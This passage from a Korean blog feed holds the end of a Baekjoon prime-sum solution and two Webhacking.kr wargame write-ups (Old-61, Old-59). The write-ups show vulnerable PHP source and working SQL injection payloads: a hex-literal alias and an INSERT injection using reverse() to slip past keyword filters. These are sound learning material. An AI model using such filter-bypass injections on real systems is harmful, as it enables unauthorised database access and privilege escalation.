class="built_in">range</span>(idx, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i, <span class="built_in">len</span>(li)):</span><br><span class="line">            <span class="keyword">if</span> li[i] + li[j] == n:</span><br><span class="line">                <span class="keyword">return</span> (li[i], li[j])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    testCase = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(testCase):</span><br><span class="line">        n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">        print(*primeSum(n, primeList(n)))</span><br></pre></td></tr></table></figure><h3 id="풀이-설명"><a href="#풀이-설명" class="headerlink" title="풀이 설명"></a>풀이 설명</h3><p>나는 입력받은 짝수의 반을 구하여, 반의 크기와 근접한 소수를 구하였다.</p><p>그리고, 반의 크키보다 작은 소수들을 더하여 n의 값이 나오면 정답을 출력하였고 만약 안나오면 처음 구한 반의 크기와 근접한 소수 보다 작은 소수로 반복하였다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/%EC%8B%A4%EB%B2%84/">실버</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%841/">백준 실버1</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/16/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%84-9020%EB%B2%88-%EB%AC%B8%EC%A0%9C/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 61 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/16/Webhacking-kr-Old-61-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/05/16/Webhacking-kr-Old-61-Write-Up/</guid>
      <pubDate>Sun, 16 May 2021 00:48:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-61"><a href="#Old-61" class="headerlink" title="Old - 61"></a>Old - 61</h2><p><img src="/images/pasted-393.png"><br>아무 것도 없이 소스코드만 던져줘서 코드를 확인하였다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;../../config.php&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span>($_GET[<span class="string">&#x27;view_source&#x27;</span>]) view_source();</span><br><span class="line">  $db = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(!$_GET[<span class="string">&#x27;id&#x27;</span>]) $_GET[<span class="string">&#x27;id&#x27;</span>]=<span class="string">&quot;guest&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Challenge 61&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=./?view_source=1&gt;view-source&lt;/a&gt;&lt;hr&gt;&quot;</span>;</span><br><span class="line">  $_GET[<span class="string">&#x27;id&#x27;</span>] = addslashes($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\(|\)|select|from|,|by|\./i&quot;</span>,$_GET[<span class="string">&#x27;id&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;Access Denied&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(strlen($_GET[<span class="string">&#x27;id&#x27;</span>])&gt;<span class="number">15</span>) <span class="keyword">exit</span>(<span class="string">&quot;Access Denied&quot;</span>);</span><br><span class="line">  $result = mysqli_fetch_array(mysqli_query($db,<span class="string">&quot;select <span class="subst">&#123;$_GET[&#x27;id&#x27;]&#125;</span> from chall61 order by id desc limit 1&quot;</span>));</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;b&gt;<span class="subst">&#123;$result[&#x27;id&#x27;]&#125;</span>&lt;/b&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&quot;admin&quot;</span>) solve(<span class="number">61</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>코드를 분석하자면,</p><p><code>if(!$_GET[&#39;id&#39;]) $_GET[&#39;id&#39;]=&quot;guest&quot;;</code><br><br>일단 디폴트로 서버에 <code>id=guest</code>라는 파라미터가 GET 메소드로 전송되고 있다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_GET[<span class="string">&#x27;id&#x27;</span>] = addslashes($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\(|\)|select|from|,|by|\./i&quot;</span>,$_GET[<span class="string">&#x27;id&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;Access Denied&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="string">&#x27;id&#x27;</span>])&gt;<span class="number">15</span>) <span class="keyword">exit</span>(<span class="string">&quot;Access Denied&quot;</span>);</span><br></pre></td></tr></table></figure><p>id 파라미터 값에 대한 검증이 addslashes 함수와 preg_match 함수로 이루어지고 있다.<br><br>필터링거나 이스케이프되는 문자열을 나열하면, <code>&#39;, &quot;, \, Null, \(, \), select, from, ,, by, \.</code>로 이루어져 있다.<br><br>또한 id 파라미터 값의 길이가 15를 초과하면 Access Denied이 출력된다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$result = mysqli_fetch_array(mysqli_query($db,<span class="string">&quot;select <span class="subst">&#123;$_GET[&#x27;id&#x27;]&#125;</span> from chall61 order by id desc limit 1&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;b&gt;<span class="subst">&#123;$result[&#x27;id&#x27;]&#125;</span>&lt;/b&gt;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>검증이 마친 id 파라미터 값은 Query문에 들어가게 되는데, <code>select ID파라미터 from chall61 order by id desc limit 1</code>로 구성되어 있다.<br><br>Query문에서 값이 반환 되면, 굵은 글자로 Query문의 결과 값을 출력한다.</p><p>현재의 상태는 id 파라미터를 따로 지정하지 않아서 guest로 되어있는 상태라, <code>select guest from chall61 order by id desc limit 1</code>로 데이터를 요청하고 있다.</p><p>이 때문에 DB의 컬럼이 guest가 있지 않은 상태라, 결과값이 출력이 되지 않는 것으로 추측이 된다.</p><p><code>if($result[&#39;id&#39;] == &quot;admin&quot;) solve(61);</code><br><br>우리의 목표인 solve 함수를 출력하기 위해서는 Query문이 admin이라는 값을 반환하도록 해야한다.</p><p>일단 검색되는 컬럼이 guest로 되어 있으니, id로 변경하여 서버에 전송하겠다.</p><p><img src="/images/pasted-394.png"><br><code>select id from chall61 order by id desc limit 1</code>로 데이터를 요청하였기 때문에 id 컬럼의 내림차순에서 조회를 하여 맨 위에 있는 딱 1개를 출력한다.</p><p>그러므로, 알파벳 순으로 맨 위에 있는 것은 test라는 것이고 a가 앞인 admin은 맨 밑에 있다는 뜻이다.</p><p>이를 파악한 나는 SQL Injection을 위해 도커 위에 있는 Mysql에 테이블을 구현하였다.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> chall61(</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">varchar</span>(<span class="number">15</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> chall61 <span class="keyword">VALUES</span> (<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> chall61 <span class="keyword">VALUES</span> (<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> chall61 <span class="keyword">VALUES</span> (<span class="string">&#x27;b&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-395.png"><br>위와 같은 테이블을 만들어서 SQL Injection를 시도할 것이다.</p><p>제일 먼저 나는 <code>select ‘admin’ from chall61 order by id desc limit 1;</code>을 생각하였다.</p><p><img src="/images/pasted-396.png"><br>이를 실행하게 되면, 무조건 admin을 출력하나 컬럼의 이름도 admin으로 변경되어 <code>$result[&#39;id&#39;]</code>에 해당이 안된다는 것을 파악을 하였다.</p><p><img src="/images/pasted-397.png" alt="`select ‘admin’ as id from chall61 order by id desc limit 1;`"><br>그래서 나는 컬럼의 이름을 대신 사용하는 문법인 as를 이용하여 SQL Injection을 시도하였다.</p><p>이를 통해 서버로 <code>&#39;admin&#39; as &#39;id&#39;</code>을 전송하였지만,<br><img src="/images/pasted-398.png"><br>아무 반응이 없다는 것을 확인할 수 있다.</p><p>정확한 확인이 필요하여,  페이지 코드를 참고하여 검증에 대한 프로그램을 만들었다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$stdin = fopen(<span class="string">&#x27;php://stdin&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">$input = trim(fread($stdin, <span class="number">1024</span>));</span><br><span class="line">fclose($stdin);</span><br><span class="line"></span><br><span class="line">$input = addslashes($input);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\(|\)|select|from|,|by|\./i&quot;</span>,$input)) <span class="keyword">echo</span> <span class="string">&quot;preg match!!!! ----&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(strlen($input)&gt;<span class="number">15</span>) <span class="keyword">echo</span> <span class="string">&quot;strlen!!!! ----&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;select <span class="subst">&#123;$input&#125;</span> from chall61 order by id desc limit 1&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;admin&#x27;</span> as id</span><br><span class="line">strlen!!!! ----&gt;select \<span class="string">&#x27;admin\&#x27;</span> as id from chall61 order by id desc <span class="built_in">limit</span> 1</span><br></pre></td></tr></table></figure><p>이를 통해 좀 더 간편하게 검증에 대해 생각할 수 있었다.</p><p>1시간이 넘게 시도했지만, 도저히 찾을 수 없어서 인터넷에 풀이를 알아봤다.</p><p>방법은 간단했다.<br><code>&#39;</code>이 사용이 불가능하니, 자동으로 String를 인식해야한다.</p><p>그 방법은 Hex값을 사용하는 것이다.</p><p><img src="/images/pasted-399.png" alt="`select 0x61646d696e from chall61 order by id desc limit 1;`"><br>직접 사용해보니, 정말 String으로 인식이 되었다.</p><p>여기서 <code>as id</code>를 추가하면 검증에 통과할 수 있는지 확인해봤다.</p><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x61646d696e as id</span><br><span class="line">strlen!!!! ----&gt;select 0x61646d696e as id from chall61 order by id desc <span class="built_in">limit</span> 1</span><br></pre></td></tr></table></figure><p>15글자를 넘어서 통과가 안되는 모습이다.</p><p>여기서 또 새로운 방법을 배울 수 있었다.</p><p><img src="/images/pasted-400.png" alt="`select 0x61646d696e id from chall61 order by id desc limit 1;`"><br>as를 굳이 쓰지 않고, 옆에 대신 사용할 값을 붙어주기만 하면 자동으로 as로 인식이 되는 것이다.</p><p>이제 서버로 저 값을 보내면,<br><img src="/images/pasted-401.png"><br>flag를 획득할 수 있다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/16/Webhacking-kr-Old-61-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 59 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/14/Webhacking-kr-Old-59-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/05/14/Webhacking-kr-Old-59-Write-Up/</guid>
      <pubDate>Fri, 14 May 2021 17:35:47 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-59"><a href="#Old-59" class="headerlink" title="Old - 59"></a>Old - 59</h2><p><img src="/images/pasted-385.png"><br>가입과 로그인 기능이 있는 form이 나왔다.<br><br>View-source가 나왔으니, 코드 상에 힌트가 있을거라 생각하여 코드를 확인하였다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;../../config.php&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span>($_GET[<span class="string">&#x27;view_source&#x27;</span>]) view_source();</span><br><span class="line">  $db = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>($_POST[<span class="string">&#x27;lid&#x27;</span>] &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;lphone&#x27;</span>]))&#123;</span><br><span class="line">    $_POST[<span class="string">&#x27;lid&#x27;</span>] = addslashes($_POST[<span class="string">&#x27;lid&#x27;</span>]);</span><br><span class="line">    $_POST[<span class="string">&#x27;lphone&#x27;</span>] = addslashes($_POST[<span class="string">&#x27;lphone&#x27;</span>]);</span><br><span class="line">    $result = mysqli_fetch_array(mysqli_query($db,<span class="string">&quot;select id,lv from chall59 where id=&#x27;<span class="subst">&#123;$_POST[&#x27;lid&#x27;]&#125;</span>&#x27; and phone=&#x27;<span class="subst">&#123;$_POST[&#x27;lphone&#x27;]&#125;</span>&#x27;&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span>($result[<span class="string">&#x27;id&#x27;</span>])&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;id : <span class="subst">&#123;$result[&#x27;id&#x27;]&#125;</span>&lt;br&gt;lv : <span class="subst">&#123;$result[&#x27;lv&#x27;]&#125;</span>&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span>($result[<span class="string">&#x27;lv&#x27;</span>] == <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">      mysqli_query($db,<span class="string">&quot;delete from chall59&quot;</span>);</span><br><span class="line">      solve(<span class="number">59</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;a href=./?view_source=1&gt;view-source&lt;/a&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>($_POST[<span class="string">&#x27;id&#x27;</span>] &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;phone&#x27;</span>]))&#123;</span><br><span class="line">    $_POST[<span class="string">&#x27;id&#x27;</span>] = addslashes($_POST[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">    $_POST[<span class="string">&#x27;phone&#x27;</span>] = addslashes($_POST[<span class="string">&#x27;phone&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(strlen($_POST[<span class="string">&#x27;phone&#x27;</span>])&gt;=<span class="number">20</span>) <span class="keyword">exit</span>(<span class="string">&quot;Access Denied&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/admin/i&quot;</span>,$_POST[<span class="string">&#x27;id&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;Access Denied&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/admin|0x|#|hex|char|ascii|ord|select/i&quot;</span>,$_POST[<span class="string">&#x27;phone&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;Access Denied&quot;</span>);</span><br><span class="line">    mysqli_query($db,<span class="string">&quot;insert into chall59 values(&#x27;<span class="subst">&#123;$_POST[&#x27;id&#x27;]&#125;</span>&#x27;,<span class="subst">&#123;$_POST[&#x27;phone&#x27;]&#125;</span>,&#x27;guest&#x27;)&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Challenge <span class="number">59</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=post&gt;</span><br><span class="line">&lt;table border=<span class="number">1</span>&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;&lt;/td&gt;</span><br><span class="line">&lt;td&gt;ID&lt;/td&gt;</span><br><span class="line">&lt;td&gt;PHONE&lt;/td&gt;</span><br><span class="line">&lt;td&gt;&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;JOIN&lt;/td&gt;</span><br><span class="line">&lt;td&gt;&lt;input name=id&gt;&lt;/td&gt;</span><br><span class="line">&lt;td&gt;&lt;input name=phone&gt;&lt;/td&gt;</span><br><span class="line">&lt;td&gt;&lt;input type=submit&gt;&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;LOGIN&lt;/td&gt;</span><br><span class="line">&lt;td&gt;&lt;input name=lid&gt;&lt;/td&gt;</span><br><span class="line">&lt;td&gt;&lt;input name=lphone&gt;&lt;/td&gt;</span><br><span class="line">&lt;td&gt;&lt;input type=submit&gt;&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;a href=./?view_source=<span class="number">1</span>&gt;view-source&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>코드를 살펴보니, 로그인을 한 계정의 Lv가 admin이면 flag가 출력되는 문제로 파악이 된다.<br><br>이를 위해선 SQL Injection 공격을 시도하여 권한을 얻어야하는 문제로 판단이 된다.</p><p>공격 백터는 로그인과 회원가입으로 둘 중 하나를 공략하기 위해 각 Query문을 살펴보았다.</p><h3 id="Login-Query"><a href="#Login-Query" class="headerlink" title="Login Query"></a>Login Query</h3><p><code>select id,lv from chall59 where id=&#39;LOGIN ID INPUT&#39; and phone=&#39;LOGIN PHONE INPUT&#39;</code><br><br>이 query문에서 SQL Injection을 통해 lv의 admin을 획득하기 위해서는 admin 권한을 가진 id를 가지고 있어야 공격이 성공하기 때문에 Login Query문에서는 공격을 시도하는 건 아니라고 판단하였다.</p><h3 id="Join-Query"><a href="#Join-Query" class="headerlink" title="Join Query"></a>Join Query</h3><p><code>insert into chall59 values(&#39;JOIN ID INPUT&#39;,JOIN PHONE INPUT,&#39;guest&#39;)</code><br><br>나는 여기서 SQL Injection을 <code>insert into chall59 values(&#39;test&#39;,123, &#39;admin&#39;)--,&#39;guest&#39;)</code>으로 시도를 하면, admin 권한을 가진 계정을 생성할 수 있다는 판단을 하였다.</p><p>하지만 Join Query에 들어가는 id와 phone의 값에서 admin과 같은 단어를 필터링하는 부분을 우회 해야한다는 문제가 있었다.</p><p><strong>필터링 단어</strong></p><ul><li>id: admin</li><li>phone: admin, 0x, #, hex, char, ascii, ord, select<br>i 옵션으로 대소문자 구분 X</li></ul><p>위 필터링을 우회하여 Lv 부분에 admin을 삽입해야한다.</p><p>나는 이를 찾기 위해 도커 안에 있는 Mysql에 구현을 하여 SQL Injection을 시도를 하였다.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> chall59(</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">varchar</span>(<span class="number">20</span>),</span><br><span class="line">    phone <span class="built_in">int</span>(<span class="number">19</span>),</span><br><span class="line">    lv <span class="built_in">varchar</span>(<span class="number">10</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> chall59 <span class="keyword">values</span>(<span class="string">&#x27;admin_user&#x27;</span>, <span class="number">111</span>, <span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> chall59;</span><br></pre></td></tr></table></figure><p>해당 코드는 내가 Mysql에 구현한 chall59 테이블이다.</p><blockquote><p>SQL Query 함수 참고 블로그: exp_blog<br><br><a href="https://syujisu.tistory.com/80">MySQL기본 쿼리 &amp; 내장함수 &amp; JOIN</a></p></blockquote><p>Mysql의 함수들을 이용하여 필터링을 우회하는 방법들을 시도하여 몇가지 방법을 찾을 수 있었다.</p><p><img src="/images/pasted-386.png" alt="`insert into chall59 values(‘test’, 222, REVERSE(‘nimda’))-- , ‘guest’);`"><br>그 중 가장 간단한 문자열을 반전시키는 reverse 함수를 사용한 SQL Injection을 이용하였다.</p><p>혹시나 내가 실수를 하여 필터링을 잘못 이해할 가능성을 생각하여, PHP 코드로 필터링 검사를 하였다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$stdin = fopen(<span class="string">&#x27;php://stdin&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">$input = trim(fread($stdin, <span class="number">1024</span>));</span><br><span class="line">fclose($stdin);</span><br><span class="line"></span><br><span class="line">$match = preg_match(<span class="string">&quot;/admin|0x|#|hex|char|ascii|ord|select/i&quot;</span>, $input);</span><br><span class="line"><span class="keyword">if</span> ($match == <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Nop!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;insert into chall59 values(&#x27;test&#x27;, <span class="subst">&#123;$input&#125;</span>, &#x27;guest&#x27;)&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight zsh"><figcaption><span>출력값</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">123, reverse(<span class="string">&#x27;nimda&#x27;</span>))-- -&gt; 입력값</span><br><span class="line">insert into chall59 values(<span class="string">&#x27;test&#x27;</span>, 123, reverse(<span class="string">&#x27;nimda&#x27;</span>))-- , <span class="string">&#x27;guest&#x27;</span>)-&gt; 출력값</span><br></pre></td></tr></table></figure><p>이때 중요한 것은  <code>--</code> 뒤에 공백을 줘야 주석처리가 이루어진다.</p><p><img src="/images/pasted-387.png"><br>이제 서버에 값을 전송하였다.</p><p><img src="/images/pasted-388.png"><br>그 결과 Access Denied가 출력되는 모습을 볼 수 있다.</p><p>한참을 생각하다가 조건문 하나를 놓친 것을 확인할 수 있었다.<br><code>if(strlen($_POST[&#39;phone&#39;])&gt;=20) exit(&quot;Access Denied&quot;);</code></p><p><img src="/images/pasted-389.png"><br>phone의 입력값이 20 미만이라는 조건을 이제서야 확인하여, SQL Injection를 수정하였다.</p><p><img src="/images/pasted-390.png"><br>방법은 id의 값을 nimda로 넣어주고, reverse 함수에 id을 넣어서 admin을 출력하겠끔 하는 방식이다.</p><p><img src="/images/pasted-391.png"><br>회원가입이 성공을 하여, 로그인을 시도하였다.</p><p><img src="/images/pasted-392.png"><br>Flag를 획득하였다.</p>]]></content:encoded>
      
      
      
      
      <comments>https://lrtk-coder.github.io/2021/05/14/Webhacking-kr-Old-59-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 42 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/13/Webhacking-kr-Old-42-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/05/13/Webhacking-kr-Old-42-Write-Up/</guid>
      <pubDate>Thu, 13 May 2021 18:24:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
